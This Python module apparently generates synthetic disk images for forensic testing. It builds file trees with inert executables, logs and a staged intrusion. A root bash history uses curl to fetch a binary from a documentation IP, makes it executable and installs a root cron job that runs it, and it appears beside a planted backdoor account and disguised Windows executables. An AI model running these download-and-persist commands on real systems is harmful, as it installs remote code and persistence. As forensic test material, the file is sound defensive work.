# ruff: noqa: E501 - hand-written synthetic log lines, one per line
"""The input model of every generated image: a tree of nodes with explicit times, plus the
inert content builders (tiny PE / ELF headers, logs, wtmp records). The ground truth is
computed from this model, never by reading an image back (phase 2 compares TSK against it).

Times are seconds since the epoch: `BASE_TIME + offset`. A file's crtime is one hour before
its mtime and its atime one minute after; ctime equals mtime.
"""

import dataclasses
import gzip
import random
import struct
from collections.abc import Iterator
from dataclasses import dataclass, field

from samples.diskgen import BASE_TIME, SEED, hives

DUMMY = b"synthetic placeholder written by cyberlab-diskgen (not a real secret)\n"


@dataclass
class Node:
    path: str  # "/a/b", '/'-separated from the file system root
    is_dir: bool
    data: bytes = b""
    mtime: int = BASE_TIME
    atime: int = BASE_TIME
    ctime: int = BASE_TIME
    crtime: int = BASE_TIME
    mode: int = 0o644
    deleted: bool = False
    streams: dict[str, bytes] = field(default_factory=dict)  # NTFS named streams
    link_to: str | None = None  # a second name of `link_to`'s inode (hard link)
    never_collect: str | None = None  # the NEVER_COLLECT_PATTERNS class it exercises

    @property
    def name(self) -> str:
        return self.path.rsplit("/", 1)[1]

    @property
    def parent(self) -> str:
        return self.path.rsplit("/", 1)[0] or "/"


def stamp(node: Node, offset: int) -> Node:
    t = BASE_TIME + offset
    node.mtime, node.atime, node.ctime, node.crtime = t, t + 60, t, t - 3600
    return node


class Tree:
    """Insertion-ordered nodes; parents are created on demand with the child's times."""

    def __init__(self, label: str) -> None:
        self.label = label
        self.nodes: dict[str, Node] = {}
        self.gaps: list[str] = []  # features this tree's file system cannot carry

    def _parents(self, path: str, offset: int) -> None:
        parts = path.strip("/").split("/")[:-1]
        for i in range(len(parts)):
            p = "/" + "/".join(parts[: i + 1])
            if p not in self.nodes:
                self.nodes[p] = stamp(Node(p, True, mode=0o755), offset)

    def dir(self, path: str, offset: int = 0) -> Node:
        self._parents(path, offset)
        if path not in self.nodes:
            self.nodes[path] = stamp(Node(path, True, mode=0o755), offset)
        return self.nodes[path]

    def file(
        self,
        path: str,
        data: bytes,
        offset: int = 0,
        *,
        mode: int = 0o644,
        streams: dict[str, bytes] | None = None,
        deleted: bool = False,
        never: str | None = None,
    ) -> Node:
        if path in self.nodes:
            raise ValueError(f"duplicate path {path}")
        self._parents(path, offset)
        node = Node(
            path,
            False,
            data,
            mode=mode,
            streams=dict(streams or {}),
            deleted=deleted,
            never_collect=never,
        )
        self.nodes[path] = stamp(node, offset)
        return node

    def link(self, path: str, target: str, offset: int = 0) -> Node:
        src = self.nodes[target]
        self._parents(path, offset)
        node = Node(
            path,
            False,
            src.data,
            mtime=src.mtime,
            atime=src.atime,
            ctime=src.ctime,
            crtime=src.crtime,
            mode=src.mode,
            link_to=target,
            never_collect=src.never_collect,
        )
        self.nodes[path] = node
        return node

    def children(self, path: str) -> list[Node]:
        return [n for n in self.nodes.values() if n.parent == path and n.path != "/"]

    def walk(self) -> Iterator[Node]:
        yield from self.nodes.values()

    def without_ntfs_features(self) -> "Tree":
        """The same tree for a file system without named streams or hard links (FAT)."""
        out = Tree(self.label)
        out.gaps = list(self.gaps)
        for node in self.nodes.values():
            if node.link_to is not None:
                out.gaps.append(f"hard link {node.path} -> {node.link_to} (not on FAT)")
                continue
            copy = dataclasses.replace(node, streams={})
            for stream in node.streams:
                out.gaps.append(f"named stream {node.path}:{stream} (not on FAT)")
            out.nodes[node.path] = copy
        return out


# --- inert content ---------------------------------------------------------------------------


def rng_bytes(tag: str, n: int) -> bytes:
    return random.Random(f"{SEED}/{tag}").randbytes(n)


def tiny_pe(tag: str) -> bytes:
    """A 1 KiB PE32 console image: headers, one `.text` section `xor eax, eax; ret` and an
    inert label. Built by us (the M3 sample generator pattern), never executed."""
    dos = bytearray(64)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x40)
    coff = struct.pack("<HHIIIHH", 0x014C, 1, 0x6A000000, 0, 0, 0xE0, 0x0102)
    optional = struct.pack(
        "<HBB9I6H4I2H6I",
        0x010B, 14, 0,
        0x200, 0, 0, 0x1000, 0x1000, 0x2000, 0x400000, 0x1000, 0x200,
        6, 0, 0, 0, 6, 0,
        0, 0x2000, 0x200, 0,
        3, 0x8540,
        0x100000, 0x1000, 0x100000, 0x1000, 0, 16,
    ) + bytes(16 * 8)  # fmt: skip
    section = struct.pack(
        "<8sIIIIIIHHI", b".text", 0x100, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020
    )
    headers = bytes(dos) + b"PE\x00\x00" + coff + optional + section
    code = b"\x31\xc0\xc3" + f"cyberlab synthetic sample: {tag}".encode()
    return headers.ljust(0x200, b"\x00") + code.ljust(0x200, b"\x00")


def tiny_elf(tag: str) -> bytes:
    """A static ELF64 x86-64 executable whose code is `exit(0)` plus an inert label."""
    code = b"\xb8\x3c\x00\x00\x00\x31\xff\x0f\x05" + f"cyberlab synthetic sample: {tag}".encode()
    size = 64 + 56 + len(code)
    ident = b"\x7fELF\x02\x01\x01" + bytes(9)
    header = ident + struct.pack(
        "<HHIQQQIHHHHHH", 2, 0x3E, 1, 0x400000 + 120, 64, 0, 0, 64, 56, 1, 64, 0, 0
    )
    phdr = struct.pack("<IIQQQQQQ", 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return header + phdr + code


def gz(data: bytes) -> bytes:
    return gzip.compress(data, compresslevel=9, mtime=0)


def utmp(records: list[tuple[int, int, str, str, str, int]]) -> bytes:
    """glibc x86-64 `struct utmp` (384 bytes): (type, pid, line, user, host, time)."""
    out = bytearray()
    for ut_type, pid, line, user, host, when in records:
        ident = line[-4:].encode()
        out += struct.pack(
            "<hxxi32s4s32s256shhiii16s20x",
            ut_type,
            pid,
            line.encode(),
            ident,
            user.encode(),
            host.encode(),
            0,
            0,
            0,
            when,
            0,
            bytes(16),
        )
    return bytes(out)


# --- the trees -------------------------------------------------------------------------------


def fat_basic() -> Tree:
    t = Tree("fat_basic")
    t.dir("/Documents", 10)
    t.file(
        "/Documents/Reports/Quarterly report for the synthetic company 2026.txt", b"Q1\n" * 400, 20
    )
    t.file("/Documents/readme.txt", b"lower-case 8.3 name, stored with a long name entry\n", 30)
    t.file("/Documents/Reports/SUMMARY.TXT", b"pure 8.3 name, no long name entry\n", 40)
    # An odd second: FAT keeps modification times with a 2-second resolution.
    t.file("/Pictures/two-second.txt", b"mtime on an odd second\n", 51)
    t.file("/Pictures/photo.raw", rng_bytes("fat_basic/photo", 9000), 60)
    t.file("/empty.txt", b"", 70)
    t.file("/DELETED.TXT", b"this file was deleted (0xE5 entry)\n" * 20, 80, deleted=True)
    return t


def small(label: str) -> Tree:
    t = Tree(label)
    t.file("/README.TXT", f"{label}: a small synthetic tree\n".encode(), 10)
    t.file("/docs/notes.txt", b"notes\n" * 50, 20)
    t.file("/docs/sub/deep.txt", b"deep\n", 30)
    t.file("/data/blob.bin", rng_bytes(f"{label}/blob", 20000), 40)
    t.file("/empty.txt", b"", 50)
    return t


_SYSLOG = """\
Mar 14 08:59:58 web01 systemd[1]: Started cron.service - Regular background program processing daemon.
Mar 14 09:00:01 web01 CRON[901]: (root) CMD (/usr/local/sbin/backup.sh)
Mar 14 09:05:01 web01 CRON[911]: (root) CMD (/tmp/.x/upd --quiet)
Mar 14 09:10:12 web01 kernel: [ 3021.114201] EXT4-fs (sda1): mounted filesystem with ordered data mode.
Mar 14 09:15:01 web01 CRON[930]: (root) CMD (/usr/local/sbin/backup.sh)
"""
_AUTH = """\
Mar 14 09:01:10 web01 sshd[1201]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2
Mar 14 09:01:14 web01 sshd[1201]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2
Mar 14 09:02:30 web01 sshd[1210]: Accepted password for alice from 198.51.100.7 port 50211 ssh2
Mar 14 09:03:05 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/useradd -m svc-backup
Mar 14 09:03:05 web01 useradd[1240]: new user: name=svc-backup, UID=1001, GID=1001, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/0
Mar 14 09:04:40 web01 sshd[1255]: Accepted publickey for svc-backup from 203.0.113.50 port 51190 ssh2: ED25519 SHA256:c3ludGhldGljLWtleS1maW5nZXJwcmludA
"""
_DPKG = """\
2026-03-14 08:40:01 startup archives unpack
2026-03-14 08:40:02 install curl:amd64 <none> 8.14.1-2
2026-03-14 08:40:03 status installed curl:amd64 8.14.1-2
"""
_BASH_ROOT = [
    (BASE_TIME + 190, "id"),
    (BASE_TIME + 200, "curl -s -o /tmp/.x/upd http://203.0.113.50/upd"),
    (BASE_TIME + 210, "chmod +x /tmp/.x/upd"),
    (BASE_TIME + 220, "echo '*/5 * * * * root /tmp/.x/upd --quiet' > /etc/cron.d/updater"),
]


def bash_history(entries: list[tuple[int, str]]) -> bytes:
    return "".join(f"#{when}\n{cmd}\n" for when, cmd in entries).encode()


LINUX_COUNTS = {
    "syslog_lines": _SYSLOG.count("\n") + _AUTH.count("\n"),
    "ssh_accepted": _AUTH.count("Accepted "),
    "dpkg_lines": _DPKG.count("\n"),
    "bash_root": len(_BASH_ROOT),
    "wtmp": 3,
}


def linux() -> Tree:
    t = Tree("ext4_linux")
    os_release = (
        'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nNAME="Debian GNU/Linux"\n'
        'VERSION_ID="13"\nID=debian\n'
    )
    t.file("/etc/os-release", os_release.encode(), 0)
    t.file("/etc/debian_version", b"13.1\n", 0)
    t.file("/etc/timezone", b"Europe/Paris\n", 0)
    t.file("/etc/hostname", b"web01\n", 0)
    t.file(
        "/etc/passwd",
        b"root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
        b"svc-backup:x:1001:1001::/home/svc-backup:/bin/bash\n",
        185,
    )
    t.file(
        "/etc/shadow",
        b"root:*:20526:0:99999:7:::\nalice:*:20526:0:99999:7:::\n",
        185,
        mode=0o640,
        never="credential_stores",
    )
    t.file("/etc/krb5.keytab", DUMMY, 5, mode=0o600, never="credential_stores")
    t.file("/etc/ssh/ssh_host_ed25519_key", DUMMY, 5, mode=0o600, never="keys_and_tokens")
    t.file("/etc/cron.d/backup", b"0 * * * * root /usr/local/sbin/backup.sh\n", 5)
    t.file("/etc/cron.d/updater", b"*/5 * * * * root /tmp/.x/upd --quiet\n", 220)
    t.file(
        "/etc/systemd/system/cyberlab-agent.service",
        b"[Unit]\nDescription=synthetic unit\n\n[Service]\nExecStart=/tmp/.x/upd\n\n"
        b"[Install]\nWantedBy=multi-user.target\n",
        230,
    )
    t.file("/usr/local/sbin/backup.sh", b"#!/bin/sh\necho backup\n", 0, mode=0o755)
    t.file("/var/log/syslog", _SYSLOG.encode(), 900)
    t.file("/var/log/auth.log", _AUTH.encode(), 300)
    t.file("/var/log/auth.log.2.gz", gz(_AUTH.replace("Mar 14", "Feb 28").encode()), -86400 * 14)
    # gzip content under a plain log name: dropped by the compressed-content rule (RT11).
    t.file("/var/log/messages", gz(b"Mar 14 09:00:00 web01 kernel: compressed\n"), 400)
    t.file("/var/log/dpkg.log", _DPKG.encode(), -1200)
    wtmp = utmp(
        [
            (2, 0, "~", "reboot", "6.12.0-synthetic", BASE_TIME - 120),
            (7, 1210, "pts/0", "alice", "198.51.100.7", BASE_TIME + 150),
            (7, 1255, "pts/1", "svc-backup", "203.0.113.50", BASE_TIME + 280),
        ]
    )
    t.file("/var/log/wtmp", wtmp, 280, mode=0o664)
    t.file("/root/.bash_history", bash_history(_BASH_ROOT), 220, mode=0o600)
    t.file(
        "/home/alice/.ssh/authorized_keys",
        b"ssh-ed25519 AAAAC3N5bnRoZXRpYw== synthetic@cyberlab\n",
        270,
    )
    t.file("/home/alice/.ssh/id_ed25519", DUMMY, 5, mode=0o600, never="keys_and_tokens")
    t.file("/home/alice/.aws/credentials", DUMMY, 5, mode=0o600, never="keys_and_tokens")
    t.file("/tmp/.x/upd", tiny_elf("linux/upd"), 205, mode=0o755)  # noqa: S108
    # RT7: a second name of the etc/shadow inode, outside every never-collect pattern.
    t.link("/var/log/old.log", "/etc/shadow", 185)
    return t


def windows() -> Tree:
    """The Windows-shaped tree. Hives are filled in by `images` (hivex-merged, or our own empty
    base hive when hivex is unavailable)."""
    t = Tree("ntfs_windows")
    base = hives.base_hive("ROOT")
    cfg = "/Windows/System32/config"
    t.file(f"{cfg}/SYSTEM", base, 0)
    t.file(f"{cfg}/SOFTWARE", base, 0)
    t.file(f"{cfg}/SAM", hives.base_hive("SAM"), 0, never="hives")
    t.file(f"{cfg}/SECURITY", hives.base_hive("SECURITY"), 0, never="hives")
    t.file(f"{cfg}/RegBack/SAM", DUMMY, 0, never="hives")
    t.file("/Windows/AppCompat/Programs/Amcache.hve", base, 100)
    t.file("/Windows/NTDS/NTDS.dit", DUMMY, 0, never="hives")
    t.file("/Windows/Panther/unattend.xml", DUMMY, 0, never="plaintext_secret_configs")
    t.file("/Windows/System32/drivers/etc/hosts", b"127.0.0.1 localhost\r\n", 0)
    t.file("/pagefile.sys", DUMMY, 0, never="memory_on_disk")
    home = "/Users/alice"
    t.file(f"{home}/NTUSER.DAT", base, 600)
    t.file(f"{home}/AppData/Local/Temp/tool.exe", tiny_pe("windows/tool"), 200)
    zone = b"[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=http://203.0.113.50/\r\n"
    t.file(
        f"{home}/Downloads/invoice.pdf.exe",
        tiny_pe("windows/invoice"),
        150,
        streams={"Zone.Identifier": zone},
    )
    t.file(f"{home}/Pictures/holiday.jpg", tiny_pe("windows/holiday"), 160)
    t.file(
        f"{home}/Documents/report.txt",
        b"quarterly report draft\r\n",
        170,
        streams={"payload": tiny_pe("windows/ads")},
    )
    startup = f"{home}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    t.file(f"{startup}/sync.exe", tiny_pe("windows/startup"), 210)
    chrome = f"{home}/AppData/Local/Google/Chrome/User Data"
    t.file(f"{chrome}/Default/Login Data", DUMMY, 50, never="browser_secrets")
    t.file(f"{chrome}/Local State", DUMMY, 50, never="browser_secrets")
    firefox = f"{home}/AppData/Roaming/Mozilla/Firefox/Profiles/q1w2e3r4.default-release"
    t.file(f"{firefox}/logins.json", DUMMY, 50, never="browser_secrets")
    t.file(f"{firefox}/key4.db", DUMMY, 50, never="browser_secrets")
    t.file(f"{home}/Documents/x.pfx", DUMMY, 50, never="keys_and_tokens")
    t.file("/Users/José/Documents/notes.txt", "notes of José\r\n".encode(), 70)
    # RT7: a second name of the SAM file (NTFS hard link; a gap on the FAT fallback).
    t.link("/Users/Public/Documents/backup.dat", f"{cfg}/SAM", 0)
    return t
